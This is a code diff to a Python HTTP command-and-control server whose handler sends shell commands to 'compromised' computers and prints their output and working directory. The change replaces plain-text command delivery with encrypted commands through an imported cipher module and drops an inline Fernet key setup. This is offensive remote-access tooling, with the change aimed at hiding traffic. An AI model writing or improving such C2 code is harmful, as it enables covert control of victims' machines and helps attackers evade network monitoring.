@@ -7,12 +7,10 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 from colorama import Fore
 from urllib.parse import unquote_plus
 from inputimeout import inputimeout, TimeoutOccurred
-from cryptography.fernet import Fernet
-from base64 import urlsafe_b64encode
-
+from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, INPUT_TIMEOUT, KEEP_ALIVE_CMD,
-                      RESPONSE, RESPONSE_KEY, BIND_ADDR, PORT, KEY)
+                      RESPONSE, RESPONSE_KEY, BIND_ADDR, PORT)
 
 
 def get_new_session():
@@ -116,7 +114,7 @@ class C2Handler(BaseHTTPRequestHandler):
                     self.http_response(200)
                     
                     # Write the Command back to the client as a Response; must use UTF-8 for encoding
-                    self.wfile.write(command.encode())
+                    self.wfile.write(cipher.encrypt(command.encode()))
                 except BrokenPipeError:
                     # Print lost connection message
                     cwd = "~"
@@ -147,8 +145,6 @@ class C2Handler(BaseHTTPRequestHandler):
         if self.path == RESPONSE:
             # Print Result of stdout arrived from the client in Plain Text format
             print(self.handle_post_data())
-
-
 
         # Follow code when a compromised Computer is responding with the current directory
         elif self.path == CWD_RESPONSE:
